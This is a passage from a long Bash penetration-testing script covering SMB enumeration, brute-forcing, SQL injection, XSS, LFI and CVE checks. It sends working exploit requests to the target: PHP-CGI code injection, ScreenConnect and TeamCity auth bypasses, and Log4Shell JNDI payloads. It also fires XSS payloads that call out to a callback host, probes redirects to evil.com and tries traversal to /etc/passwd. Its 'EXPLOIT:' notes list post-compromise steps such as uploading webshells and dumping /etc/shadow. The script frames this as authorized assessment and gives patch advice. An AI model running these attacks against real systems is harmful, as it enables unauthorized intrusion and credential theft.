            smbmap -H "$TARGET" --no-banner 2>/dev/null || true
        run_tool_timeout "smbmap-recurse" "${OUTPUT_DIR}/smbmap/smbmap_recurse.txt" 90 \
            smbmap -H "$TARGET" -R --no-banner 2>/dev/null || true

        grep -qiE "READ|WRITE" "${OUTPUT_DIR}/smbmap/smbmap.txt" 2>/dev/null && \
            add_vuln "HIGH" "SMB Shares with Read/Write Access Found" \
                "SMB shares are accessible without credentials or with default creds." \
                "Audit share permissions. Remove unnecessary shares. Require authentication." \
                "$(grep -iE 'READ|WRITE' "${OUTPUT_DIR}/smbmap/smbmap.txt" | head -5)"
    fi

    # smbclient null session
    if command -v smbclient &>/dev/null; then
        run_tool_timeout "smbclient-shares" "${OUTPUT_DIR}/enum4linux/smbclient_shares.txt" 30 \
            smbclient -L "//${TARGET}" -N --no-pass 2>/dev/null || true
    fi

    # crackmapexec SMB
    if command -v crackmapexec &>/dev/null; then
        run_tool_timeout "cme-smb" "${OUTPUT_DIR}/crackmapexec/cme_smb.txt" 60 \
            crackmapexec smb "$TARGET" 2>/dev/null || true
        run_tool_timeout "cme-shares" "${OUTPUT_DIR}/crackmapexec/cme_shares.txt" 60 \
            crackmapexec smb "$TARGET" --shares 2>/dev/null || true

        local cmef="${OUTPUT_DIR}/crackmapexec/cme_smb.txt"
        if [[ -f "$cmef" ]]; then
            grep -qi "SMBv1.*True" "$cmef" && \
                add_vuln "HIGH" "SMBv1 Protocol Enabled" \
                    "SMBv1 is obsolete and vulnerable to EternalBlue/WannaCry. No longer supported by Microsoft." \
                    "Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol \$false" \
                    "CrackMapExec: SMBv1 enabled"
            grep -qiE "signing: False|SMB signing: False" "$cmef" && \
                add_vuln "HIGH" "SMB Signing Disabled (CME Confirmed)" \
                    "SMB signing disabled — NTLM relay attacks are possible." \
                    "Enable SMB signing via GPO or smb.conf." \
                    "CrackMapExec: SMB signing: False"
        fi
    fi

    # rpcclient null session
    # BUG FIX: -U "" --no-pass is rejected by modern rpcclient; correct null-session is -U '%'
    if command -v rpcclient &>/dev/null; then
        local rpc_out; rpc_out=$(echo "querydominfo" | timeout 15 \
            rpcclient -U '%' "$TARGET" 2>/dev/null | head -5 || echo "")
        [[ -n "$rpc_out" ]] && echo "$rpc_out" > "${OUTPUT_DIR}/enum4linux/rpc_dominfo.txt"
    fi

    log_ok "Phase 16 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 17 — AUTHENTICATION & CREDENTIAL TESTING
# ════════════════════════════════════════════════════════════════════════════════
phase_auth() {
    log_phase 17 "${PHASE_NAMES[17]}"

    local user_list="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
    local pass_list="/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt"
    [[ ! -f "$user_list" ]] && user_list="/usr/share/wordlists/metasploit/unix_users.txt"
    [[ ! -f "$pass_list" ]] && pass_list="/usr/share/wordlists/metasploit/unix_passwords.txt"

    # Default credential check (manual check for common services)
    log_section "Default credential surface check..."
    local -a default_creds=(
        "admin:admin" "admin:password" "admin:admin123" "admin:pass"
        "root:root" "root:toor" "root:password" "root:" "admin:" 
        "administrator:administrator" "guest:guest" "test:test" "user:user"
    )

    # HTTP Basic Auth + Form check
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        for cred in "${default_creds[@]}"; do
            local user="${cred%%:*}" pass="${cred##*:}"
            local code; code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
                -u "${user}:${pass}" "${web_url}/admin" 2>/dev/null || echo "000")
            if [[ "$code" == "200" ]]; then
                add_vuln "CRITICAL" "Default Credentials Work: ${cred} at ${web_url}/admin" \
                    "HTTP basic auth accepts default credentials — full admin access without any cracking." \
                    "Change all default credentials immediately. Enforce password complexity policies." \
                    "curl -u ${cred} ${web_url}/admin — HTTP ${code}" \
                    "EXPLOIT: Browser login to /admin with default creds -> admin panel -> upload webshell or dump DB via phpMyAdmin." \
                    "PATCH: 1) Change all default passwords to 16+ char random. 2) Enable MFA. 3) Restrict /admin to internal IPs. 4) Account lockout after 5 failures."
            fi
        done
    done

    # FTP brute (if open)
    if echo "$OPEN_PORTS" | grep -qE "(^|,)21(,|$)" && command -v hydra &>/dev/null \
       && [[ "$SCAN_PROFILE" != "quick" ]] && [[ -f "$user_list" ]] && [[ -f "$pass_list" ]]; then
        run_tool_timeout "hydra-ftp" "${OUTPUT_DIR}/hydra/hydra_ftp.txt" 120 \
            hydra -L "$user_list" -P "$pass_list" -t 4 -f \
            "$TARGET" ftp 2>/dev/null || true
        grep -qi "\[21\].*login:" "${OUTPUT_DIR}/hydra/hydra_ftp.txt" 2>/dev/null && \
            add_vuln "CRITICAL" "FTP Credentials Found via Brute-Force" \
                "FTP service has weak/default credentials that were cracked." \
                "Change credentials. Disable FTP. Use SFTP/FTPS." \
                "$(grep '\[21\].*login:' "${OUTPUT_DIR}/hydra/hydra_ftp.txt" | head -3)" \
                "EXPLOIT: ftp TARGET -> login with cracked creds -> ls -la; mget *.conf *.php *.env -> extract DB creds, SSH keys, source code from downloaded files." \
                "PATCH: 1) Change FTP password immediately. 2) Disable FTP: systemctl stop vsftpd && systemctl disable vsftpd. 3) Use SFTP over SSH. 4) If FTP needed: restrict to trusted IPs, enforce FTPS, deploy fail2ban."
    fi

    # SSH brute (careful — only in deep mode with small wordlist)
    if echo "$OPEN_PORTS" | grep -qE "(^|,)22(,|$)" && command -v hydra &>/dev/null \
       && [[ "$SCAN_PROFILE" == "deep" ]] && [[ -f "$user_list" ]] && [[ -f "$pass_list" ]]; then
        run_tool_timeout "hydra-ssh" "${OUTPUT_DIR}/hydra/hydra_ssh.txt" 180 \
            hydra -L "$user_list" -P "$pass_list" -t 4 -f \
            -s 22 "$TARGET" ssh 2>/dev/null || true
        grep -qi "\[22\].*login:" "${OUTPUT_DIR}/hydra/hydra_ssh.txt" 2>/dev/null && \
            add_vuln "CRITICAL" "SSH Credentials Found via Brute-Force" \
                "SSH service has weak/default credentials." \
                "Enforce SSH key-based auth. Disable password auth. Use fail2ban." \
                "$(grep '\[22\].*login:' "${OUTPUT_DIR}/hydra/hydra_ssh.txt" | head -3)" \
                "EXPLOIT: ssh user@TARGET (with cracked password) -> full shell -> sudo -l; cat /etc/shadow; find / -perm -4000 2>/dev/null (SUID) -> root escalation in minutes." \
                "PATCH: 1) Disable password auth: PasswordAuthentication no in /etc/ssh/sshd_config; systemctl restart sshd. 2) SSH keys only. 3) Deploy fail2ban. 4) Restrict SSH to VPN/jump host. 5) Enable 2FA."
    fi

    # RDP brute
    if echo "$OPEN_PORTS" | grep -qE "(^|,)3389(,|$)" && command -v hydra &>/dev/null \
       && [[ "$SCAN_PROFILE" == "deep" ]] && [[ -f "$user_list" ]] && [[ -f "$pass_list" ]]; then
        run_tool_timeout "hydra-rdp" "${OUTPUT_DIR}/hydra/hydra_rdp.txt" 120 \
            hydra -L "$user_list" -P "$pass_list" -t 4 -f \
            "$TARGET" rdp 2>/dev/null || true
    fi

    # SMB brute
    if echo "$OPEN_PORTS" | grep -qE "(^|,)445(,|$)" && command -v crackmapexec &>/dev/null \
       && [[ "$SCAN_PROFILE" != "quick" ]] && [[ -f "$user_list" ]] && [[ -f "$pass_list" ]]; then
        run_tool_timeout "cme-brute" "${OUTPUT_DIR}/crackmapexec/cme_brute.txt" 120 \
            crackmapexec smb "$TARGET" -u "$user_list" -p "$pass_list" \
            --continue-on-success 2>/dev/null || true
        grep -qiE "\[+\].*Pwn3d|\[+\].*STATUS_SUCCESS" \
            "${OUTPUT_DIR}/crackmapexec/cme_brute.txt" 2>/dev/null && \
            add_vuln "CRITICAL" "SMB Credentials Found (Pwn3d)" \
                "SMB login succeeded with brute-forced credentials — potential domain admin access." \
                "Enforce account lockout policies. Use complex passwords." \
                "$(grep '\[+\]' "${OUTPUT_DIR}/crackmapexec/cme_brute.txt" | head -3)"
    fi

    # kerbrute (Kerberos - port 88)
    # BUG FIX: -d requires FQDN realm, not an IP — guard with TARGET_TYPE
    if echo "$OPEN_PORTS" | grep -qE "(^|,)88(,|$)" && command -v kerbrute &>/dev/null \
       && [[ -f "$user_list" ]] && [[ "$TARGET_TYPE" == "DOMAIN" ]]; then
        run_tool_timeout "kerbrute" "${OUTPUT_DIR}/hydra/kerbrute.txt" 60 \
            kerbrute userenum -d "$TARGET" "$user_list" \
            --dc "$TARGET" 2>/dev/null || true
        grep -qi "VALID USERNAME" "${OUTPUT_DIR}/hydra/kerbrute.txt" 2>/dev/null && \
            add_vuln "HIGH" "Kerberos User Enumeration Successful" \
                "Valid Active Directory usernames enumerated via Kerberos pre-auth error differentiation." \
                "Implement account lockout. Monitor Kerberos failures. Enable audit policies." \
                "$(grep 'VALID USERNAME' "${OUTPUT_DIR}/hydra/kerbrute.txt" | head -5)"
    fi

    log_ok "Phase 17 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 18 — SQL INJECTION DEEP TESTING
# ════════════════════════════════════════════════════════════════════════════════
phase_sqli() {
    log_phase 18 "${PHASE_NAMES[18]}"
    [[ ${#WEB_TARGETS[@]} -eq 0 ]] && WEB_TARGETS=("http://${TARGET}")

    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        local slug; slug=$(echo "$web_url" | sed 's|[/:.]|_|g')

        if command -v sqlmap &>/dev/null; then
            # BUG FIX: use array for sqlmap args — unquoted string splits badly with IFS=$'\n\t'
            local -a sqlmap_args=(
                --url="${web_url}" --batch --random-agent --level=2 --risk=2
            )
            local sqlmap_output="${OUTPUT_DIR}/sqlmap/sqlmap_${slug}"
            mkdir -p "$sqlmap_output" 2>/dev/null || true

            # BUG FIX: arithmetic string comparison → always 300; use proper conditional
            local sqlmap_t=300; [[ "$SCAN_PROFILE" == "deep" ]] && sqlmap_t=600
            run_tool_timeout "sqlmap-crawl-${slug}" \
                "${sqlmap_output}/sqlmap_crawl.txt" "$sqlmap_t" \
                sqlmap "${sqlmap_args[@]}" \
                --crawl=3 --forms --dbs \
                --output-dir="$sqlmap_output" 2>/dev/null || true

            if [[ -d "$sqlmap_output" ]]; then
                local sqli_found; sqli_found=$(find "$sqlmap_output" -name "*.log" \
                    -exec grep -l "is vulnerable\|injectable" {} \; 2>/dev/null | wc -l || echo 0)

                if [[ ${sqli_found:-0} -gt 0 ]]; then
                    add_vuln "CRITICAL" "SQL Injection Vulnerabilities Detected (${web_url})" \
                        "SQLMap confirmed injectable parameters. Attacker can dump database, achieve code execution." \
                        "Use parameterized queries/prepared statements. Implement WAF. Apply principle of least privilege for DB users." \
                        "sqlmap: ${sqli_found} injection point(s) confirmed" \
                        "EXPLOIT: sqlmap -u URL?id=1 --batch --dbs --dump. Chain with --os-shell for RCE on MySQL/MSSQL. Time: 5-15 min." \
                        "PATCH: 1) Prepared statements. 2) ORM. 3) Least-priv DB user. 4) ModSecurity OWASP CRS WAF. 5) Input validation."

                    # Try to get databases if deep mode
                    if [[ "$SCAN_PROFILE" == "deep" ]]; then
                        grep -r "available databases" "$sqlmap_output" 2>/dev/null | head -10 \
                            >> "${sqlmap_output}/databases_found.txt" || true
                    fi
                fi
            fi
        fi

        # Manual SQL probe with ghauri
        if command -v ghauri &>/dev/null; then
            run_tool_timeout "ghauri-${slug}" "${OUTPUT_DIR}/sqlmap/ghauri_${slug}.txt" 120 \
                ghauri -u "${web_url}/?id=1" --dbs --batch 2>/dev/null || true
            grep -qiE "vulnerable|database" "${OUTPUT_DIR}/sqlmap/ghauri_${slug}.txt" 2>/dev/null && \
                add_vuln "CRITICAL" "SQL Injection Confirmed by Ghauri (${web_url})" \
                    "Ghauri confirmed SQL injection on target." \
                    "Apply parameterized queries. Sanitize all inputs." \
                    "ghauri: injection confirmed on ${web_url}"
        fi

        # ── Behavioral Proofing: Differential Boolean SQLi Analysis ────────────
        # A vulnerability is proven ONLY by measurable behavioral delta, not string matching.
        # Send baseline, boolean-true, and boolean-false payloads.
        # Confirm ONLY if: size(true) ≈ size(baseline) AND size(false) ≠ size(baseline).
        log_section "Differential Boolean SQLi probes (${web_url})..."
        local common_params=("id" "page" "search" "q" "cat" "item" "user" "name")
        for param in "${common_params[@]}"; do
            # 1. Baseline: clean request
            local baseline_size; baseline_size=$(curl -s --max-time 10 --max-filesize 51200 \
                -A "Mozilla/5.0" -o /dev/null -w "%{size_download}" \
                "${web_url}?${param}=1" 2>/dev/null || echo "0")
            baseline_size=$(echo "$baseline_size" | tr -cd '0-9')
            baseline_size=$(( 10#0${baseline_size} ))
            [[ $baseline_size -eq 0 ]] && continue

            # 2. Boolean TRUE payload: should behave identically to baseline
            local true_payload; true_payload=$(python3 -c \
                "import urllib.parse; print(urllib.parse.quote(\"1 AND 1=1\"))" 2>/dev/null \
                || echo "1%20AND%201%3D1")
            local true_size; true_size=$(curl -s --max-time 10 --max-filesize 51200 \
                -A "Mozilla/5.0" -o /dev/null -w "%{size_download}" \
                "${web_url}?${param}=${true_payload}" 2>/dev/null || echo "0")
            true_size=$(echo "$true_size" | tr -cd '0-9')
            true_size=$(( 10#0${true_size} ))

            # 3. Boolean FALSE payload: should produce divergent response
            local false_payload; false_payload=$(python3 -c \
                "import urllib.parse; print(urllib.parse.quote(\"1 AND 1=2\"))" 2>/dev/null \
                || echo "1%20AND%201%3D2")
            local false_size; false_size=$(curl -s --max-time 10 --max-filesize 51200 \
                -A "Mozilla/5.0" -o /dev/null -w "%{size_download}" \
                "${web_url}?${param}=${false_payload}" 2>/dev/null || echo "0")
            false_size=$(echo "$false_size" | tr -cd '0-9')
            false_size=$(( 10#0${false_size} ))

            # 4. Differential Analysis: TRUE ≈ BASELINE, FALSE ≠ BASELINE
            local true_delta=$(( baseline_size - true_size )); true_delta=${true_delta#-}
            local false_delta=$(( baseline_size - false_size )); false_delta=${false_delta#-}

            # Threshold: TRUE must be within 5% of baseline; FALSE must diverge by >10%
            local threshold_close=$(( baseline_size / 20 ))  # 5%
            [[ $threshold_close -lt 10 ]] && threshold_close=10
            local threshold_far=$(( baseline_size / 10 ))    # 10%
            [[ $threshold_far -lt 50 ]] && threshold_far=50

            if [[ $true_delta -le $threshold_close && $false_delta -ge $threshold_far ]]; then
                add_vuln "CRITICAL" "SQL Injection (Boolean Differential) — Parameter: ${param} (${web_url})" \
                    "Boolean-based blind SQLi confirmed via behavioral delta. Baseline=${baseline_size}B, TRUE=${true_size}B (Δ${true_delta}), FALSE=${false_size}B (Δ${false_delta}). WAF-proof confirmation." \
                    "Implement parameterized queries. Disable verbose error messages in production." \
                    "${web_url}?${param}= — Differential: baseline=${baseline_size} true=${true_size} false=${false_size}"
                break
            fi
        done
    done

    log_ok "Phase 18 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 19 — XSS & CLIENT-SIDE ATTACK VECTORS
# ════════════════════════════════════════════════════════════════════════════════
phase_xss() {
    log_phase 19 "${PHASE_NAMES[19]}"
    [[ ${#WEB_TARGETS[@]} -eq 0 ]] && WEB_TARGETS=("http://${TARGET}")

    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        local slug; slug=$(echo "$web_url" | sed 's|[/:.]|_|g')

        # dalfox — modern XSS scanner
        if command -v dalfox &>/dev/null; then
            # BUG FIX: arithmetic string comparison always yields 60; use proper conditional
            local dalfox_t=180; [[ "$SCAN_PROFILE" == "quick" ]] && dalfox_t=60
            # BUG FIX: removed --output (same file as run_tool_timeout outfile → double-write)
            run_tool_timeout "dalfox-${slug}" "${OUTPUT_DIR}/dalfox/dalfox_${slug}.txt" \
                "$dalfox_t" \
                dalfox url "$web_url" --no-spinner --silence 2>/dev/null || true
            grep -qiE "\[V\]|\[VULN\]|XSS" "${OUTPUT_DIR}/dalfox/dalfox_${slug}.txt" 2>/dev/null && \
                add_vuln "ONE_CLICK" "One-Click Account Takeover via XSS — Dalfox (${web_url})" \
                    "Dalfox confirmed XSS vulnerability. Attacker can steal cookies, perform CSRF, or redirect users." \
                    "Implement CSP. Sanitize all user inputs. Use output encoding." \
                    "$(grep -E '\[V\]|\[VULN\]' "${OUTPUT_DIR}/dalfox/dalfox_${slug}.txt" | head -3)"
        fi

        # xsstrike
        # BUG FIX: removed --output (same file as run_tool_timeout outfile → double-write)
        if command -v xsstrike &>/dev/null && [[ "$SCAN_PROFILE" != "quick" ]]; then
            run_tool_timeout "xsstrike-${slug}" "${OUTPUT_DIR}/xsstrike/xsstrike_${slug}.txt" 120 \
                python3 "$(command -v xsstrike)" -u "$web_url" --crawl 2>/dev/null || true
            grep -qiE "XSS Vulnerability|vulnerable" \
                "${OUTPUT_DIR}/xsstrike/xsstrike_${slug}.txt" 2>/dev/null && \
                add_vuln "HIGH" "XSS Confirmed by XSStrike (${web_url})" \
                    "XSStrike found exploitable XSS vulnerability." \
                    "Implement input validation and output encoding." \
                    "xsstrike: XSS confirmed"
        fi

        # ── Behavioral Proofing: OOB-Exclusive XSS Verification ────────────────
        # Response body is NEVER trusted. XSS is confirmed ONLY via OOB callback.
        # If interactsh is unavailable, manual XSS probes are SKIPPED entirely.
        log_section "OOB XSS probes (${web_url})..."
        if [[ -n "${INTERACTSH_URL:-}" ]]; then
            local xss_token="xss-${RANDOM}-$(date +%s)"
            local oob_xss_payload="<img src=x onerror=fetch('http://${xss_token}.${INTERACTSH_URL}')>"
            local enc_oob_payload; enc_oob_payload=$(python3 -c \
                "import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))" \
                "$oob_xss_payload" 2>/dev/null || printf '%s' "$oob_xss_payload")
            for xss_param in q search s name input msg comment query term; do
                curl -s --max-time 8 -A "Mozilla/5.0" \
                    "${web_url}?${xss_param}=${enc_oob_payload}" \
                    -o /dev/null 2>/dev/null || true
            done
            log_info "XSS OOB payloads dispatched (token: ${xss_token}). Callback verification deferred to Phase 28 OOB audit."
        else
            log_info "Dispatcher: Interactsh unavailable. Manual XSS probes SKIPPED (no behavioral proof mechanism)."
        fi

        # Open redirect check
        # BUG FIX: curl -s -I only accepts ONE URL; extra URLs are silently ignored — use loop
        local redirect_test=""
        for redir_path in \
            "/redirect?url=https://evil.com" \
            "?next=https://evil.com" \
            "?return=https://evil.com"; do
            local redir_check; redir_check=$(curl -s -I --max-time 10 \
                "${web_url}${redir_path}" 2>/dev/null \
                | grep -i "Location.*evil\.com" | head -1 || echo "")
            if [[ -n "$redir_check" ]]; then
                redirect_test="$redir_check"
                break
            fi
        done
        [[ -n "$redirect_test" ]] && \
            add_vuln "ONE_CLICK" "One-Click Redirect Phishing / OAuth Token Theft (${web_url})" \
                "Application redirects to attacker-controlled URLs — enables phishing and OAuth token theft." \
                "Whitelist allowed redirect destinations. Validate all redirect parameters." \
                "Location header: $redirect_test"

        # ── Behavioral Proofing: OOB-Exclusive SSRF Verification ──────────────
        # Response body is NEVER trusted. SSRF confirmed ONLY via OOB callback.
        if [[ -n "${INTERACTSH_URL:-}" ]]; then
            local ssrf_token="ssrf-p19-${RANDOM}-$(date +%s)"
            local ssrf_oob_params=("url" "path" "fetch" "redirect" "src" "source")
            for sp in "${ssrf_oob_params[@]}"; do
                curl -s --max-time 8 \
                    "${web_url}?${sp}=http://${ssrf_token}.${INTERACTSH_URL}" \
                    -o /dev/null 2>/dev/null || true
            done
            log_info "SSRF OOB payloads dispatched (token: ${ssrf_token}). Callback verification deferred to Phase 28 OOB audit."
        else
            log_info "Dispatcher: Interactsh unavailable. SSRF probes SKIPPED (no behavioral proof mechanism)."
        fi

        # Command injection probes
        if command -v commix &>/dev/null && [[ "$SCAN_PROFILE" != "quick" ]]; then
            local commix_out="${OUTPUT_DIR}/commix/commix_${slug}.txt"
            # BUG FIX: commix writes its log to --output-dir/<hostname>/; run_tool_timeout
            # captures stdout separately. Check both the stdout capture AND the commix dir.
            run_tool_timeout "commix-${slug}" "$commix_out" 120 \
                commix --url="${web_url}" --batch --crawl=2 \
                --output-dir="${OUTPUT_DIR}/commix/" 2>/dev/null || true
            # Check both captured stdout and any files commix wrote to --output-dir
            local commix_hit=false
            grep -qiE "shell>|injectable|vulnerable\[!" "$commix_out" 2>/dev/null && commix_hit=true
            find "${OUTPUT_DIR}/commix/" -name "*.txt" -newer "$commix_out" \
                -exec grep -qli "shell>\|injectable" {} \; 2>/dev/null && commix_hit=true
            if [[ "$commix_hit" == true ]]; then
                add_vuln "CRITICAL" "Command Injection Detected — commix (${web_url})" \
                    "Command injection allows OS-level command execution on the server." \
                    "Sanitize all inputs. Avoid shell execution. Use parameterized system calls." \
                    "commix: command injection confirmed"
            fi
        fi

        # ── Behavioral Proofing: Differential LFI Analysis ─────────────────────
        # Response body string ("root:x:") is NEVER trusted — WAFs spoof it.
        # LFI is confirmed via size differential: real traversal path vs impossible control path.
        log_section "Differential LFI probes (${web_url})..."
        local lfi_payloads=("../../etc/passwd" "....//....//etc/passwd" "%2e%2e%2fetc%2fpasswd")
        for lfi in "${lfi_payloads[@]}"; do
            # Real payload
            local lfi_real_size; lfi_real_size=$(curl -s --max-time 10 --max-filesize 51200 \
                -o /dev/null -w "%{size_download}" \
                "${web_url}?file=${lfi}" 2>/dev/null || echo "0")
            lfi_real_size=$(echo "$lfi_real_size" | tr -cd '0-9')
            lfi_real_size=$(( 10#0${lfi_real_size} ))

            # Control: provably impossible path — if LFI is real, this MUST differ
            local lfi_ctrl_size; lfi_ctrl_size=$(curl -s --max-time 10 --max-filesize 51200 \
                -o /dev/null -w "%{size_download}" \
                "${web_url}?file=../../acromap_nonexistent_${RANDOM}.txt" 2>/dev/null || echo "0")
            lfi_ctrl_size=$(echo "$lfi_ctrl_size" | tr -cd '0-9')
            lfi_ctrl_size=$(( 10#0${lfi_ctrl_size} ))

            # Differential: real payload must return MORE data than control
            local lfi_delta=$(( lfi_real_size - lfi_ctrl_size ))
            if [[ $lfi_real_size -gt 100 && $lfi_delta -gt 50 ]]; then
                add_vuln "CRITICAL" "Local File Inclusion (LFI) — Differential Confirmed" \
                    "LFI confirmed via behavioral delta. Traversal response=${lfi_real_size}B, Control=${lfi_ctrl_size}B (Δ${lfi_delta}B). WAF-proof confirmation." \
                    "Never use user input in file path operations. Whitelist allowed files. Chroot application." \
                    "${web_url}?file=${lfi} — Differential: real=${lfi_real_size} ctrl=${lfi_ctrl_size}"
                break
            fi
        done
    done

    log_ok "Phase 19 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 20 — CVE 2024–2026 TARGETED CHECKS
# ════════════════════════════════════════════════════════════════════════════════
phase_cve_checks() {
    log_phase 20 "${PHASE_NAMES[20]}"
    local cve_dir="${OUTPUT_DIR}/cve_checks"
    mkdir -p "$cve_dir" 2>/dev/null || true

    log_section "Running 2024–2026 CVE-specific behavioral checks..."

    # ── CVE-2024-6387 ─ OpenSSH regreSSHion (RCE) ────────────────────────────
    # Banner check is acceptable here as SSH banners are protocol-mandated and not easily WAF-spoofed.
    if echo "$OPEN_PORTS" | grep -qE "(^|,)22(,|$)"; then
        local ssh_banner; ssh_banner=$(timeout 5 nc -w 3 "$TARGET" 22 2>/dev/null | head -1 || echo "")
        echo "SSH Banner: $ssh_banner" > "${cve_dir}/CVE-2024-6387.txt"
        if echo "$ssh_banner" | grep -qiE "OpenSSH_[1-8]\.[0-8]|OpenSSH_9\.[0-7]p[01]|OpenSSH_9\.[0-7] "; then
            if echo "$ssh_banner" | grep -qiE "OpenSSH_[1-7]\.|OpenSSH_8\.[0-9]|OpenSSH_9\.[0-7]"; then
                add_vuln "ZERO_DAY" "CVE-2024-6387: OpenSSH regreSSHion — Unauthenticated RCE as Root" \
                    "OpenSSH versions < 9.8p1 have a race condition in signal handler (regreSSHion). Allows unauthenticated RCE as root on glibc-based Linux. CVSS 8.1. Actively exploited in the wild." \
                    "Update OpenSSH to 9.8p1 or later immediately. As interim: set LoginGraceTime 0 in sshd_config (prevents exploitation by closing race window)." \
                    "Banner: ${ssh_banner}" \
                    "EXPLOIT: Attacker opens thousands of SSH connections simultaneously, racing to exploit the async signal handler before LoginGraceTime expires. The signal handler calls async-signal-unsafe functions (e.g. syslog via malloc), creating a heap corruption opportunity that leads to unauthenticated root shell. PoC published by Qualys (Jul 2024). Shodan shows millions of vulnerable systems." \
                    "PATCH: 1) Upgrade: apt-get install --only-upgrade openssh-server. 2) INTERIM: add LoginGraceTime 0 to /etc/ssh/sshd_config then systemctl restart sshd. 3) Restrict SSH to VPN-only via firewall: ufw deny 22; ufw allow from 10.0.0.0/8 to any port 22. 4) Enable fail2ban: apt install fail2ban."
            fi
        fi
    fi

    # ── CVE-2024-4577 ─ PHP CGI Argument Injection (RCE) ─────────────────────
    # Behavioral Proof: Safe Execution (echo unique string)
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        _is_valid_url "$web_url" || continue
        local php_resp; php_resp=$(curl -s --max-time 10 --max-filesize 51200 \
            "${web_url}/php-cgi/php-cgi?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "<?php echo md5('acromap_php_cgi_rce'); ?>" 2>/dev/null || echo "")
        
        if echo "$php_resp" | grep -q "0a1e38ecbfa75ea211516e87f28edbdc"; then
            add_vuln "ZERO_DAY" "CVE-2024-4577: PHP CGI Remote Code Execution — Actively Exploited" \
                "PHP CGI argument injection on Windows allows unauthenticated RCE — critical severity, actively exploited." \
                "Update PHP immediately. Disable PHP CGI or use mod_php/PHP-FPM. Block CGI paths." \
                "${web_url}: CVE-2024-4577 RCE confirmed via safe code execution (MD5 hash returned)"
        fi
    done

    # ── CVE-2024-1709 ─ ConnectWise ScreenConnect Auth Bypass ────────────────
    # Behavioral Proof: Differential Auth State
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        _is_valid_url "$web_url" || continue
        
        # Control: Normal request to SetupWizard (should be forbidden/redirected if already setup)
        local cw_ctrl; cw_ctrl=$(curl -s -I --max-time 10 "${web_url}/SetupWizard.aspx" 2>/dev/null | head -1 | grep -E "302|401|403|404" || echo "FAIL")
        
        # Exploit: Append slash to trigger bypass. Honeypots will return 200 for both.
        local cw_exploit; cw_exploit=$(curl -s --max-time 10 "${web_url}/SetupWizard.aspx/" 2>/dev/null | head -c 8192 || echo "")
        
        if [[ "$cw_ctrl" != "FAIL" ]] && echo "$cw_exploit" | grep -qi "SetupWizard" && echo "$cw_exploit" | grep -qi "viewstate"; then
            # Verify it's not a global honeypot by checking a random path
            local cw_honey; cw_honey=$(curl -s -I --max-time 10 "${web_url}/SetupWizard_$(date +%s).aspx/" 2>/dev/null | head -1 | grep "200" || echo "CLEAN")
            if [[ "$cw_honey" == "CLEAN" ]]; then
                add_vuln "CRITICAL" "CVE-2024-1709: ConnectWise ScreenConnect Auth Bypass" \
                    "ScreenConnect SetupWizard path bypass allows unauthenticated administrative access — full system compromise. CVSS 10.0." \
                    "Update ScreenConnect to 23.9.8+. Block SetupWizard.aspx at firewall. Apply ConnectWise advisory." \
                    "${web_url}/SetupWizard.aspx/ — Auth bypass confirmed via differential state (Control blocked, Exploit accessed)"
            fi
        fi
    done

    # ── CVE-2024-27198 ─ TeamCity Auth Bypass ───────────────────────────────
    # Behavioral Proof: Differential Auth State
    if echo "$OPEN_PORTS" | grep -qiE "(^|,)(8111|8112)(,|$)"; then
        for web_url in "${WEB_TARGETS[@]:0:5}"; do
            _is_valid_url "$web_url" || continue
            
            # Control: Try to access authenticated API
            local tc_ctrl; tc_ctrl=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${web_url}/app/rest/server" 2>/dev/null)
            
            # Exploit: Access via bypass path
            local tc_exploit; tc_exploit=$(curl -s --max-time 10 "${web_url}/app/rest/server;.jsp" 2>/dev/null | head -c 4096 || echo "")
            
            if [[ "$tc_ctrl" == "401" ]] && echo "$tc_exploit" | grep -qi "version=" && echo "$tc_exploit" | grep -qi "server"; then
                add_vuln "CRITICAL" "CVE-2024-27198: TeamCity Authentication Bypass" \
                    "JetBrains TeamCity versions < 2023.11.4 have auth bypass allowing unauthenticated RCE and credential theft." \
                    "Update TeamCity immediately. Apply JetBrains security advisory. Isolate CI/CD systems." \
                    "${web_url}: TeamCity Auth Bypass confirmed via differential API access"
            fi
        done
    fi

    # ── Log4Shell (CVE-2021-44228) ─ OOB Proof ──────────────────────────────
    # Behavioral Proof: OOB DNS/LDAP Callback
    if [[ -n "${INTERACTSH_URL:-}" ]] && [[ -s "${OUTPUT_DIR}/raw_logs/interactsh.json" ]]; then
        local log4j_token="log4shell-${RANDOM}"
        local log4j_payload='${jndi:ldap://'"${log4j_token}.${INTERACTSH_URL}"'/a}'
        local dispatched=false
        for web_url in "${WEB_TARGETS[@]:0:5}"; do
            _is_valid_url "$web_url" || continue
            curl -s --max-time 5 \
                --header "X-Api-Version: ${log4j_payload}" \
                --header "User-Agent: ${log4j_payload}" \
                "${web_url}" -o /dev/null 2>/dev/null || true
            dispatched=true
        done
        
        if [[ "$dispatched" == true ]]; then
            sleep 3 # Grace period for LDAP callback
            local log4j_cbs; log4j_cbs=$(grep -c "${log4j_token}" "${OUTPUT_DIR}/raw_logs/interactsh.json" 2>/dev/null || true)
            log4j_cbs=$(( 10#0${log4j_cbs} ))
            if [[ $log4j_cbs -gt 0 ]]; then
                add_vuln "ZERO_DAY" "CVE-2021-44228: Log4Shell Confirmed via OOB Callback" \
                    "Unauthenticated RCE via JNDI injection. The target server made an LDAP callback to our OOB server." \
